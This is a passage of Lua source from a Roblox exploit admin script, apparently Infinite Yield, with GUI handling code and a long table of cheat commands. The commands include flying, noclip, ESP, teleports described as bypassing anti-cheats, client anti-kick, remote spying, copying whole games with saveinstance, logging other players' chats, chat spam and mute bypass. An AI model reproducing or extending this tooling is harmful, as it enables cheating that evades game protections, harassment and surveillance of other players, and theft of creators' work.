	selectionBox.Color3 = Color3.new(255,255,255)
	selectionBox.Adornee = nil
	selectionBox.Parent = PARENT

	local selected = Instance.new("SelectionBox")
	selected.Name = randomString()
	selected.Color3 = Color3.new(0,166,0)
	selected.Adornee = nil
	selected.Parent = PARENT

	local ActivateHighlight = nil
	local ClickSelect = nil
	function selectPart()
		ToPartFrame:TweenPosition(UDim2.new(0.5, -180, 0, 335), "InOut", "Quart", 0.5, true, nil)
		local function HighlightPart()
			if selected.Adornee ~= IYMouse.Target then
				selectionBox.Adornee = IYMouse.Target
			else
				selectionBox.Adornee = nil
			end
		end
		ActivateHighlight = IYMouse.Move:Connect(HighlightPart)
		local function SelectPart()
			if IYMouse.Target ~= nil then
				selected.Adornee = IYMouse.Target
				Path.Text = getHierarchy(IYMouse.Target)
			end
		end
		ClickSelect = IYMouse.Button1Down:Connect(SelectPart)
	end

	Part.MouseButton1Click:Connect(function()
		selectPart()
	end)

	Exit_4.MouseButton1Click:Connect(function()
		ToPartFrame:TweenPosition(UDim2.new(0.5, -180, 0, -500), "InOut", "Quart", 0.5, true, nil)
		if ActivateHighlight then
			ActivateHighlight:Disconnect()
		end
		if ClickSelect then
			ClickSelect:Disconnect()
		end
		selectionBox.Adornee = nil
		selected.Adornee = nil
		Path.Text = ""
	end)

	CopyPath.MouseButton1Click:Connect(function()
		if Path.Text ~= "" then
			toClipboard(Path.Text)
		else
			notify('Copy Path','Select a part to copy its path')
		end
	end)

	ChoosePart.MouseButton1Click:Connect(function()
		if Path.Text ~= "" then
			local tpNameExt = ''
			local function handleWpNames()
				local FoundDupe = false
				for i,v in pairs(pWayPoints) do
					if v.NAME:lower() == selected.Adornee.Name:lower()..tpNameExt then
						FoundDupe = true
					end
				end
				if not FoundDupe then
					notify('Modified Waypoints',"Created waypoint: "..selected.Adornee.Name..tpNameExt)
					pWayPoints[#pWayPoints + 1] = {NAME = selected.Adornee.Name..tpNameExt, COORD = {selected.Adornee}}
				else
					if isNumber(tpNameExt) then
						tpNameExt = tpNameExt+1
					else
						tpNameExt = 1
					end
					handleWpNames()
				end
			end
			handleWpNames()
			refreshwaypoints()
		else
			notify('Part Selection','Select a part first')
		end
	end)

	cmds={}
	customAlias = {}
	Delete_3.MouseButton1Click:Connect(function()
		customAlias = {}
		aliases = {}
		notify('Aliases Modified','Removed all aliases')
		updatesaves()
		refreshaliases()
	end)

	PrefixBox:GetPropertyChangedSignal("Text"):Connect(function()
		prefix = PrefixBox.Text
		Cmdbar.PlaceholderText = "Command Bar ("..prefix..")"
		updatesaves()
	end)

	function CamViewport()
		if workspace.CurrentCamera then
			return workspace.CurrentCamera.ViewportSize.X
		end
	end

	function UpdateToViewport()
		if Holder.Position.X.Offset < -CamViewport() then
			Holder:TweenPosition(UDim2.new(1, -CamViewport(), Holder.Position.Y.Scale, Holder.Position.Y.Offset), "InOut", "Quart", 0.04, true, nil)
			Notification:TweenPosition(UDim2.new(1, -CamViewport() + 250, Notification.Position.Y.Scale, Notification.Position.Y.Offset), "InOut", "Quart", 0.04, true, nil)
		end
	end
	CameraChanged = workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(UpdateToViewport)

	function updateCamera(child, parent)
		if parent ~= workspace then
			CamMoved:Disconnect()
			CameraChanged:Disconnect()
			repeat wait() until workspace.CurrentCamera
			CameraChanged = workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(UpdateToViewport)
			CamMoved = workspace.CurrentCamera.AncestryChanged:Connect(updateCamera)
		end
	end
	CamMoved = workspace.CurrentCamera.AncestryChanged:Connect(updateCamera)

	function dragMain(dragpoint,gui)
		spawn(function()
			local dragging
			local dragInput
			local dragStart = Vector3.new(0,0,0)
			local startPos
			local function update(input)
				local pos = -250
				local delta = input.Position - dragStart
				if startPos.X.Offset + delta.X <= -500 then
					local Position = UDim2.new(1, -250, Notification.Position.Y.Scale, Notification.Position.Y.Offset)
					game:GetService("TweenService"):Create(Notification, TweenInfo.new(.20), {Position = Position}):Play()
					pos = 250
				else
					local Position = UDim2.new(1, -500, Notification.Position.Y.Scale, Notification.Position.Y.Offset)
					game:GetService("TweenService"):Create(Notification, TweenInfo.new(.20), {Position = Position}):Play()
					pos = -250
				end
				if startPos.X.Offset + delta.X <= -250 and -CamViewport() <= startPos.X.Offset + delta.X then
					local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, gui.Position.Y.Scale, gui.Position.Y.Offset)
					game:GetService("TweenService"):Create(gui, TweenInfo.new(.20), {Position = Position}):Play()
					local Position2 = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X + pos, Notification.Position.Y.Scale, Notification.Position.Y.Offset)
					game:GetService("TweenService"):Create(Notification, TweenInfo.new(.20), {Position = Position2}):Play()
				elseif startPos.X.Offset + delta.X > -500 then
					local Position = UDim2.new(1, -250, gui.Position.Y.Scale, gui.Position.Y.Offset)
					game:GetService("TweenService"):Create(gui, TweenInfo.new(.20), {Position = Position}):Play()
				elseif -CamViewport() > startPos.X.Offset + delta.X then
					gui:TweenPosition(UDim2.new(1, -CamViewport(), gui.Position.Y.Scale, gui.Position.Y.Offset), "InOut", "Quart", 0.04, true, nil)
					local Position = UDim2.new(1, -CamViewport(), gui.Position.Y.Scale, gui.Position.Y.Offset)
					game:GetService("TweenService"):Create(gui, TweenInfo.new(.20), {Position = Position}):Play()
					local Position2 = UDim2.new(1, -CamViewport() + 250, Notification.Position.Y.Scale, Notification.Position.Y.Offset)
					game:GetService("TweenService"):Create(Notification, TweenInfo.new(.20), {Position = Position2}):Play()
				end
			end
			dragpoint.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					dragging = true
					dragStart = input.Position
					startPos = gui.Position

					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragging = false
						end
					end)
				end
			end)
			dragpoint.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
					dragInput = input
				end
			end)
			UserInputService.InputChanged:Connect(function(input)
				if input == dragInput and dragging then
					update(input)
				end
			end)
		end)
	end

	dragMain(Title,Holder)

	Match = function(name,str)
		str = str:gsub("%W", "%%%1")
		return name:lower():find(str:lower()) and true
	end

	local canvasPos = Vector2.new(0,0)
	local topCommand = nil
	IndexContents = function(str,bool,cmdbar,Ianim)
		local SizeY = 0
		local indexnum = 0
		local frame = CMDsF
		topCommand = nil
		local chunks = {}
		if str:sub(#str,#str) == "\\" then str = "" end
		for w in string.gmatch(str,"[^\\]+") do
			table.insert(chunks,w)
		end
		if #chunks > 0 then str = chunks[#chunks] end
		if str:sub(1,1) == "!" then str = str:sub(2) end
		for i,v in next, frame:GetChildren() do
			if v:IsA("TextButton") then
				if bool then
					if Match(v.Text,str) then
						indexnum = indexnum + 1
						v.Visible = true
						if topCommand == nil then
							topCommand = v.Text
						end
					else
						v.Visible = false
					end
				else
					v.Visible = true
					if topCommand == nil then
						topCommand = v.Text
					end
				end
			end
		end
		frame.CanvasSize = UDim2.new(0,0,0,cmdListLayout.AbsoluteContentSize.Y)
		if not Ianim then
			if indexnum == 0 or string.find(str, " ") then
				if not cmdbar then
					minimizeHolder()
				elseif cmdbar then
					cmdbarHolder()
				end
			else
				maximizeHolder()
			end
		else
			minimizeHolder()
		end
	end

	PlayerGui = Players.LocalPlayer:FindFirstChildOfClass("PlayerGui")
	local chatbox
	spawn(function()
		if pcall(function() chatbox = PlayerGui:WaitForChild("Chat").Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar end) then	
			local function chatboxFocused()
				canvasPos = CMDsF.CanvasPosition
			end
			local chatboxFocusedC = chatbox.Focused:Connect(chatboxFocused)

			local function Index()
				if chatbox.Text:lower():sub(1,1) == prefix then
					if SettingsOpen == true then
						wait(0.2)
						CMDsF.Visible = true
						Settings:TweenPosition(UDim2.new(0, 0, 0, 220), "InOut", "Quart", 0.2, true, nil)
					end
					IndexContents(PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar.Text:lower():sub(2),true)
				else
					minimizeHolder()
					if SettingsOpen == true then
						wait(0.2)
						Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.2, true, nil)
						CMDsF.Visible = false
					end
				end
			end
			local chatboxFunc = chatbox:GetPropertyChangedSignal("Text"):Connect(Index)

			function chatboxFocusLost(enterpressed)
				if not enterpressed or chatbox.Text:lower():sub(1,1) ~= prefix then
					IndexContents('',true)
				end
				CMDsF.CanvasPosition = canvasPos
				minimizeHolder()
			end
			local chatboxFocusLostC = chatbox.FocusLost:Connect(chatboxFocusLost)

			PlayerGui:WaitForChild("Chat").Frame.ChatBarParentFrame.ChildAdded:Connect(function(newbar)
				wait()
				if newbar:FindFirstChild('BoxFrame') then
					chatbox = PlayerGui:WaitForChild("Chat").Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar
					if chatboxFocusedC then chatboxFocusedC:Disconnect() end
					chatboxFocusedC = chatbox.Focused:Connect(chatboxFocused)
					if chatboxFunc then chatboxFunc:Disconnect() end
					chatboxFunc = chatbox:GetPropertyChangedSignal("Text"):Connect(Index)
					if chatboxFocusLostC then chatboxFocusLostC:Disconnect() end
					chatboxFocusLostC = chatbox.FocusLost:Connect(chatboxFocusLost)
				end
			end)
			--else
			--print('Custom chat detected. Will not provide suggestions for commands typed in the chat.')
		end
	end)

	function autoComplete(str,curText)
		local endingChar = {"[", "/", "(", " "}
		local stop = 0
		for i=1,#str do
			local c = str:sub(i,i)
			if table.find(endingChar, c) then
				stop = i
				break
			end
		end
		curText = curText or Cmdbar.Text
		local subPos = 0
		local pos = 1
		local findRes = string.find(curText,"\\",pos)
		while findRes do
			subPos = findRes
			pos = findRes+1
			findRes = string.find(curText,"\\",pos)
		end
		if curText:sub(subPos+1,subPos+1) == "!" then subPos = subPos + 1 end
		Cmdbar.Text = curText:sub(1,subPos) .. str:sub(1, stop - 1)..' '
		wait()
		Cmdbar.Text = Cmdbar.Text:gsub( '\t', '' )
		Cmdbar.CursorPosition = #Cmdbar.Text+1--1020
	end

	CMDs = {}
	CMDs[#CMDs + 1] = {NAME = 'console', DESC = 'Loads old Roblox console'}
	CMDs[#CMDs + 1] = {NAME = 'explorer / dex', DESC = 'Opens DEX explorer'}
	CMDs[#CMDs + 1] = {NAME = 'remotespy / rspy', DESC = 'Opens FrostHook Spy'}
	CMDs[#CMDs + 1] = {NAME = 'audiologger / alogger', DESC = 'Opens Edges audio logger'}
	CMDs[#CMDs + 1] = {NAME = 'serverinfo / info', DESC = 'Gives you info about the server'}
	CMDs[#CMDs + 1] = {NAME = 'jobid', DESC = 'Copies the games JobId to your clipboard'}
	CMDs[#CMDs + 1] = {NAME = 'notifyjobid', DESC = 'Notifies you the games JobId'}
	CMDs[#CMDs + 1] = {NAME = 'rejoin / rj', DESC = 'Makes you rejoin the game'}
	CMDs[#CMDs + 1] = {NAME = 'autorejoin / autorj', DESC = 'Automatically rejoins the server if you get kicked/disconnected'}
	CMDs[#CMDs + 1] = {NAME = 'serverhop / shop', DESC = 'Teleports you to a different server'}
	CMDs[#CMDs + 1] = {NAME = 'joinplayer [username / ID] [place ID]', DESC = 'Joins a specific players server'}
	CMDs[#CMDs + 1] = {NAME = 'gameteleport / gametp [place ID]', DESC = 'Joins a game by ID'}
	CMDs[#CMDs + 1] = {NAME = 'antiidle / antiafk', DESC = 'Prevents the game from kicking you for being idle/afk'}
	CMDs[#CMDs + 1] = {NAME = 'datalimit [num]', DESC = 'Set outgoing KBPS limit'}
	CMDs[#CMDs + 1] = {NAME = 'replicationlag / backtrack [num]', DESC = 'Set IncomingReplicationLag'}
	CMDs[#CMDs + 1] = {NAME = 'creatorid / creator', DESC = 'Notifies you the creators ID'}
	CMDs[#CMDs + 1] = {NAME = 'copycreatorid / copycreator', DESC = 'Copies the creators ID to your clipboard'}
	CMDs[#CMDs + 1] = {NAME = 'setcreatorid / setcreator', DESC = 'Sets your userid to the creators ID'}
	CMDs[#CMDs + 1] = {NAME = 'noprompts', DESC = 'Prevents the game from showing you purchase/premium prompts'}
	CMDs[#CMDs + 1] = {NAME = 'showprompts', DESC = 'Allows the game to show purchase/premium prompts again'}
	CMDs[#CMDs + 1] = {NAME = 'enable [inventory/playerlist/chat/all]', DESC = 'Toggles visibility of coregui items'}
	CMDs[#CMDs + 1] = {NAME = 'disable [inventory/playerlist/chat/all]', DESC = 'Toggles visibility of coregui items'}
	CMDs[#CMDs + 1] = {NAME = 'showguis', DESC = 'Shows any invisible GUIs'}
	CMDs[#CMDs + 1] = {NAME = 'unshowguis', DESC = 'Undoes showguis'}
	CMDs[#CMDs + 1] = {NAME = 'hideguis', DESC = 'Hides any GUIs in PlayerGui'}
	CMDs[#CMDs + 1] = {NAME = 'unhideguis', DESC = 'Undoes hideguis'}
	CMDs[#CMDs + 1] = {NAME = 'guidelete', DESC = 'Enables backspace to delete GUI'}
	CMDs[#CMDs + 1] = {NAME = 'unguidelete / noguidelete', DESC = 'Disables guidelete'}
	CMDs[#CMDs + 1] = {NAME = 'hideiy', DESC = 'Hides the main IY GUI'}
	CMDs[#CMDs + 1] = {NAME = 'showiy', DESC = 'Shows IY again'}
	CMDs[#CMDs + 1] = {NAME = 'savegame / saveplace', DESC = 'Uses saveinstance to save the game'}
	CMDs[#CMDs + 1] = {NAME = 'clearerror', DESC = 'Clears the annoying box and blur when a game kicks you'}
	CMDs[#CMDs + 1] = {NAME = 'clientantikick / antikick (CLIENT)', DESC = 'Prevents localscripts from kicking you'}
	CMDs[#CMDs + 1] = {NAME = 'clientantiteleport / antiteleport (CLIENT)', DESC = 'Prevents localscripts from teleporting you'}
	CMDs[#CMDs + 1] = {NAME = 'allowrejoin / allowrj [true/false] (CLIENT)', DESC = 'Changes if antiteleport allows you to rejoin or not'}
	CMDs[#CMDs + 1] = {NAME = 'cancelteleport / canceltp', DESC = 'Cancels teleports in progress'}
	CMDs[#CMDs + 1] = {NAME = 'volume / vol [0-10]', DESC = 'Adjusts your game volume on a scale of 0 to 10'}
	CMDs[#CMDs + 1] = {NAME = 'antilag / boostfps / lowgraphics', DESC = 'Lowers game quality to boost FPS'}
	CMDs[#CMDs + 1] = {NAME = 'record / rec', DESC = 'Starts roblox recorder'}
	CMDs[#CMDs + 1] = {NAME = 'screenshot / scrnshot', DESC = 'Takes a screenshot'}
	CMDs[#CMDs + 1] = {NAME = 'togglefullscreen / togglefs', DESC = 'Toggles fullscreen'}
	CMDs[#CMDs + 1] = {NAME = 'notify [text]', DESC = 'Sends you a notification with the provided text'}
	CMDs[#CMDs + 1] = {NAME = 'lastcommand / lastcmd', DESC = 'Executes the previous command used'}
	CMDs[#CMDs + 1] = {NAME = 'exit', DESC = 'Kills roblox process'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'noclip', DESC = 'Go through objects'}
	CMDs[#CMDs + 1] = {NAME = 'unnoclip / clip', DESC = 'Disables noclip'}
	CMDs[#CMDs + 1] = {NAME = 'fly [speed]', DESC = 'Makes you fly'}
	CMDs[#CMDs + 1] = {NAME = 'unfly', DESC = 'Disables fly'}
	CMDs[#CMDs + 1] = {NAME = 'flyspeed [num]', DESC = 'Set fly speed (default is 20)'}
	CMDs[#CMDs + 1] = {NAME = 'vehiclefly / vfly [speed]', DESC = 'Makes you fly in a vehicle'}
	CMDs[#CMDs + 1] = {NAME = 'unvehiclefly / unvfly', DESC = 'Disables vehicle fly'}
	CMDs[#CMDs + 1] = {NAME = 'vehicleflyspeed  / vflyspeed [num]', DESC = 'Set vehicle fly speed'}
	CMDs[#CMDs + 1] = {NAME = 'cframefly / cfly [speed]', DESC = 'Makes you fly, bypassing some anti cheats'}
	CMDs[#CMDs + 1] = {NAME = 'uncframefly / uncfly', DESC = 'Disables cfly'}
	CMDs[#CMDs + 1] = {NAME = 'cframeflyspeed  / cflyspeed [num]', DESC = 'Sets cfly speed'}
	CMDs[#CMDs + 1] = {NAME = 'qefly [true / false]', DESC = 'enables or disables the Q and E hotkeys for fly'}
	CMDs[#CMDs + 1] = {NAME = 'vehiclenoclip / vnoclip', DESC = 'Turns off vehicle collision'}
	CMDs[#CMDs + 1] = {NAME = 'vehicleclip / vclip / unvnoclip', DESC = 'Enables vehicle collision'}
	CMDs[#CMDs + 1] = {NAME = 'float /  platform', DESC = 'Spawns a platform beneath you causing you to float'}
	CMDs[#CMDs + 1] = {NAME = 'unfloat / noplatform', DESC = 'Removes the platform'}
	CMDs[#CMDs + 1] = {NAME = 'swim', DESC = 'Allows you to swim in the air'}
	CMDs[#CMDs + 1] = {NAME = 'unswim / noswim', DESC = 'Stops you from swimming everywhere'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'setwaypoint / swp [name]', DESC = 'Sets a waypoint at your position'}
	CMDs[#CMDs + 1] = {NAME = 'waypointpos / wpp [name] [X Y Z]', DESC = 'Sets a waypoint with specified coordinates'}
	CMDs[#CMDs + 1] = {NAME = 'showwaypoints / showwp', DESC = 'Shows all currently set waypoints'}
	CMDs[#CMDs + 1] = {NAME = 'hidewaypoints / hidewp', DESC = 'Hides shown waypoints'}
	CMDs[#CMDs + 1] = {NAME = 'waypoint / wp [name]', DESC = 'Teleports player to a waypoint'}
	CMDs[#CMDs + 1] = {NAME = 'tweenwaypoint / twp [name]', DESC = 'Tweens player to a waypoint'}
	CMDs[#CMDs + 1] = {NAME = 'walktowaypoint / wtwp [name]', DESC = 'Walks player to a waypoint'}
	CMDs[#CMDs + 1] = {NAME = 'deletewaypoint / dwp [name]', DESC = 'Deletes a waypoint'}
	CMDs[#CMDs + 1] = {NAME = 'clearwaypoints / cwp', DESC = 'Clears all waypoints'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'goto [plr]', DESC = 'Go to a player'}
	CMDs[#CMDs + 1] = {NAME = 'tweengoto / tgoto [plr]', DESC = 'Tween to a player (bypasses some anti cheats)'}
	CMDs[#CMDs + 1] = {NAME = 'tweenspeed / tspeed [num]', DESC = 'Sets how fast all tween commands go (default is 1)'}
	CMDs[#CMDs + 1] = {NAME = 'vehiclegoto / vgoto [plr]', DESC = 'Go to a player while in a vehicle'}
	CMDs[#CMDs + 1] = {NAME = 'loopgoto [plr] [distance] [delay]', DESC = 'Loop teleport to a player'}
	CMDs[#CMDs + 1] = {NAME = 'unloopgoto', DESC = 'Stops teleporting you to a player'}
	CMDs[#CMDs + 1] = {NAME = 'clientbring / cbring [plr] (CLIENT)', DESC = 'Bring a player'}
	CMDs[#CMDs + 1] = {NAME = 'loopbring [plr] [distance] [delay] (CLIENT)', DESC = 'Loop brings a player to you (useful for killing)'}
	CMDs[#CMDs + 1] = {NAME = 'unloopbring [plr]', DESC = 'Undoes loopbring'}
	CMDs[#CMDs + 1] = {NAME = 'freeze / fr [plr] (CLIENT)', DESC = 'Freezes a player'}
	CMDs[#CMDs + 1] = {NAME = 'thaw / unfr [plr] (CLIENT)', DESC = 'Unfreezes a player'}
	CMDs[#CMDs + 1] = {NAME = 'tpposition / tppos [X Y Z]', DESC = 'Teleports you to certain coordinates'}
	CMDs[#CMDs + 1] = {NAME = 'tweentpposition / ttppos [X Y Z]', DESC = 'Tween to coordinates (bypasses some anti cheats)'}
	CMDs[#CMDs + 1] = {NAME = 'offset [X Y Z]', DESC = 'Offsets you by certain coordinates'}
	CMDs[#CMDs + 1] = {NAME = 'tweenoffset / toffset [X Y Z]', DESC = 'Tween offset (bypasses some anti cheats)'}
	CMDs[#CMDs + 1] = {NAME = 'notifyposition / notifypos [plr]', DESC = 'Notifies you the coordinates of a character'}
	CMDs[#CMDs + 1] = {NAME = 'copyposition / copypos [plr]', DESC = 'Copies the coordinates of a character to your clipboard'}
	CMDs[#CMDs + 1] = {NAME = 'walktoposition / walktopos [X Y Z]', DESC = 'Makes you walk to a coordinate'}
	CMDs[#CMDs + 1] = {NAME = 'spawnpoint / spawn [delay]', DESC = 'Sets a position where you will spawn'}
	CMDs[#CMDs + 1] = {NAME = 'nospawnpoint / nospawn', DESC = 'Removes your custom spawn point'}
	CMDs[#CMDs + 1] = {NAME = 'flashback / diedtp', DESC = 'Teleports you to where you last died'}
	CMDs[#CMDs + 1] = {NAME = 'walltp', DESC = 'Teleports you above/over any wall you run into'}
	CMDs[#CMDs + 1] = {NAME = 'nowalltp / unwalltp', DESC = 'Disables walltp'}
	CMDs[#CMDs + 1] = {NAME = 'teleporttool / tptool', DESC = 'Gives you a teleport tool'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'logs', DESC = 'Opens the logs GUI'}
	CMDs[#CMDs + 1] = {NAME = 'chatlogs / clogs', DESC = 'Log what people say or whisper'}
	CMDs[#CMDs + 1] = {NAME = 'joinlogs / jlogs', DESC = 'Log when people join'}
	CMDs[#CMDs + 1] = {NAME = 'chat / say [text]', DESC = 'Makes you chat a string (possible mute bypass)'}
	CMDs[#CMDs + 1] = {NAME = 'spam [text]', DESC = 'Makes you spam the chat'}
	CMDs[#CMDs + 1] = {NAME = 'unspam', DESC = 'Turns off spam'}
	CMDs[#CMDs + 1] = {NAME = 'whisper / pm [plr] [text]', DESC = 'Makes you whisper a string to someone (possible mute bypass)'}
	CMDs[#CMDs + 1] = {NAME = 'pmspam [plr] [text]', DESC = 'Makes you spam a players whispers'}
	CMDs[#CMDs + 1] = {NAME = 'unpmspam [plr]', DESC = 'Turns off pm spam'}
	CMDs[#CMDs + 1] = {NAME = 'spamspeed [num]', DESC = 'How quickly you spam (default is 1)'}
	CMDs[#CMDs + 1] = {NAME = 'bubblechat (CLIENT)', DESC = 'Enables bubble chat for your client'}
	CMDs[#CMDs + 1] = {NAME = 'unbubblechat / nobubblechat', DESC = 'Disables the bubblechat command'}
	CMDs[#CMDs + 1] = {NAME = 'safechat', DESC = 'Enables safe chat'}
	CMDs[#CMDs + 1] = {NAME = 'nosafechat / disablesafechat', DESC = 'Disables safechat'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'esp', DESC = 'View all players and their status'}
	CMDs[#CMDs + 1] = {NAME = 'noesp / unesp', DESC = 'Removes esp'}
	CMDs[#CMDs + 1] = {NAME = 'partesp [part name]', DESC = 'Highlights a part'}
	CMDs[#CMDs + 1] = {NAME = 'unpartesp / nopartesp [part name]', DESC = 'removes partesp'}
	CMDs[#CMDs + 1] = {NAME = 'chams', DESC = 'ESP but without text in the way'}
	CMDs[#CMDs + 1] = {NAME = 'nochams / unchams', DESC = 'Removes chams'}
	CMDs[#CMDs + 1] = {NAME = 'locate [plr]', DESC = 'View a single player and their status'}
	CMDs[#CMDs + 1] = {NAME = 'unlocate / nolocate [plr]', DESC = 'Removes locate'}
	CMDs[#CMDs + 1] = {NAME = 'xray', DESC = 'Makes all parts in workspace transparent'}
	CMDs[#CMDs + 1] = {NAME = 'unxray / noxray', DESC = 'Restores transparency'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'spectate / view [plr]', DESC = 'View a player'}
	CMDs[#CMDs + 1] = {NAME = 'viewpart / viewp [part name]', DESC = 'View a part'}
	CMDs[#CMDs + 1] = {NAME = 'unspectate / unview', DESC = 'Stops viewing player'}
	CMDs[#CMDs + 1] = {NAME = 'freecam / fc', DESC = 'Allows you to freely move camera around the game'}
	CMDs[#CMDs + 1] = {NAME = 'freecampos / fcpos [X Y Z]', DESC = 'Moves / opens freecam in a certain position'}
	CMDs[#CMDs + 1] = {NAME = 'freecamwaypoint / fcwp [name]', DESC = 'Moves / opens freecam to a waypoint'}
	CMDs[#CMDs + 1] = {NAME = 'freecamgoto / fcgoto / fctp [plr]', DESC = 'Moves / opens freecam to a player'}
	CMDs[#CMDs + 1] = {NAME = 'unfreecam / unfc', DESC = 'Disables freecam'}
	CMDs[#CMDs + 1] = {NAME = 'freecamspeed / fcspeed [num]', DESC = 'Adjusts freecam speed (default is 1)'}
	CMDs[#CMDs + 1] = {NAME = 'gotocamera / gotocam', DESC = 'Teleports you to the location of your camera'}
	CMDs[#CMDs + 1] = {NAME = 'tweengotocam / tgotocam', DESC = 'Tweens you to the location of your camera'}
	CMDs[#CMDs + 1] = {NAME = 'firstp', DESC = 'Forces camera to go into first person'}
	CMDs[#CMDs + 1] = {NAME = 'thirdp', DESC = 'Allows camera to go into third person'}
	CMDs[#CMDs + 1] = {NAME = 'noclipcam / nccam', DESC = 'Allows camera to go through objects like walls'}
	CMDs[#CMDs + 1] = {NAME = 'maxzoom [num]', DESC = 'Maximum camera zoom'}
	CMDs[#CMDs + 1] = {NAME = 'minzoom [num]', DESC = 'Minimum camera zoom'}
	CMDs[#CMDs + 1] = {NAME = 'fov [num]', DESC = 'Adjusts field of view (default is 70)'}
	CMDs[#CMDs + 1] = {NAME = 'fixcam / restorecam', DESC = 'Fixes camera'}
	CMDs[#CMDs + 1] = {NAME = 'enableshiftlock / enablesl', DESC = 'Enables the shift lock option'}
	CMDs[#CMDs + 1] = {NAME = 'lookat [plr]', DESC = 'Moves your camera view to a player'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'btools (CLIENT)', DESC = 'Gives you building tools (DOES NOT REPLICATE)'}
	CMDs[#CMDs + 1] = {NAME = 'f3x (CLIENT)', DESC = 'Gives you F3X building tools (DOES NOT REPLICATE)'}
	CMDs[#CMDs + 1] = {NAME = 'partname / partpath', DESC = 'Allows you to click a part to see its path & name'}
	CMDs[#CMDs + 1] = {NAME = 'delete [instance name] (CLIENT)', DESC = 'Removes any part with a certain name from the workspace (DOES NOT REPLICATE)'}
	CMDs[#CMDs + 1] = {NAME = 'deleteclass / dc [class name] (CLIENT)', DESC = 'Removes any part with a certain classname from the workspace (DOES NOT REPLICATE)'}
	CMDs[#CMDs + 1] = {NAME = 'lockworkspace / lockws', DESC = 'Locks the whole workspace'}
	CMDs[#CMDs + 1] = {NAME = 'unlockworkspace / unlockws', DESC = 'Unlocks the whole workspace'}
	CMDs[#CMDs + 1] = {NAME = 'invisibleparts / invisparts (CLIENT)', DESC = 'Shows invisible parts'}
	CMDs[#CMDs + 1] = {NAME = 'uninvisibleparts / uninvisparts (CLIENT)', DESC = 'Makes parts affected by invisparts return to normal'}
	CMDs[#CMDs + 1] = {NAME = 'deleteinvisparts / dip (CLIENT)', DESC = 'Deletes invisible parts'}
	CMDs[#CMDs + 1] = {NAME = 'gotopart [part name]', DESC = 'Moves your character to a part or multiple parts'}
	CMDs[#CMDs + 1] = {NAME = 'tweengotopart / tgotopart [part name]', DESC = 'Tweens your character to a part or multiple parts'}
	CMDs[#CMDs + 1] = {NAME = 'gotopartclass / gpc [class name]', DESC = 'Moves your character to a part or multiple parts based on classname'}
	CMDs[#CMDs + 1] = {NAME = 'tweengotopartclass / tgpc [class name]', DESC = 'Tweens your character to a part or multiple parts based on classname'}
	CMDs[#CMDs + 1] = {NAME = 'gotomodel [part name]', DESC = 'Moves your character to a model or multiple models'}
	CMDs[#CMDs + 1] = {NAME = 'tweengotomodel / tgotomodel [part name]', DESC = 'Tweens your character to a model or multiple models'}
	CMDs[#CMDs + 1] = {NAME = 'gotopartdelay / gotomodeldelay [num]', DESC = 'Adjusts how quickly you teleport to each part (default is 0.1)'}
	CMDs[#CMDs + 1] = {NAME = 'bringpart [part name] (CLIENT)', DESC = 'Moves a part or multiple parts to your character'}
	CMDs[#CMDs + 1] = {NAME = 'bringpartclass / bpc [class name] (CLIENT)', DESC = 'Moves a part or multiple parts to your character based on classname'}
	CMDs[#CMDs + 1] = {NAME = 'noclickdetectorlimits / nocdlimits', DESC = 'Sets all click detectors MaxActivationDistance to math.huge'}
	CMDs[#CMDs + 1] = {NAME = 'fireclickdetectors / firecd', DESC = 'Uses all click detectors in a game'}
	CMDs[#CMDs + 1] = {NAME = 'firetouchinterests / touchinterests', DESC = 'Uses all touchinterests in a game'}
	CMDs[#CMDs + 1] = {NAME = 'simulationradius / simradius', DESC = 'Sets your SimulationRadius to math.huge'}
	CMDs[#CMDs + 1] = {NAME = 'nosimulationradius / nosimradius', DESC = 'Turns off the SimulationRadius loop and restores values to default'}
	CMDs[#CMDs + 1] = {NAME = 'tpunanchored / tpua [plr]', DESC = 'Teleports unanchored parts to a player'}
	CMDs[#CMDs + 1] = {NAME = 'freezeunanchored / freezeua', DESC = 'Freezes unanchored parts'}
	CMDs[#CMDs + 1] = {NAME = 'thawunanchored / thawua / unfreezeua', DESC = 'Thaws unanchored parts'}
	CMDs[#CMDs + 1] = {NAME = 'removeterrain / rterrain / noterrain', DESC = 'Removes all terrain'}
	CMDs[#CMDs + 1] = {NAME = 'clearnilinstances / nonilinstances / cni', DESC = 'Removes nil instances'}
	CMDs[#CMDs + 1] = {NAME = 'destroyheight / dh [num]', DESC = 'Sets FallenPartsDestroyHeight'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'fullbright / fb (CLIENT)', DESC = 'Makes the map brighter / more visible'}
	CMDs[#CMDs + 1] = {NAME = 'loopfullbright / loopfb (CLIENT)', DESC = 'Makes the map brighter / more visible but looped'}
	CMDs[#CMDs + 1] = {NAME = 'ambient [num] [num] [num] (CLIENT)', DESC = 'Changes ambient'}
	CMDs[#CMDs + 1] = {NAME = 'day (CLIENT)', DESC = 'Changes the time to day for the client'}
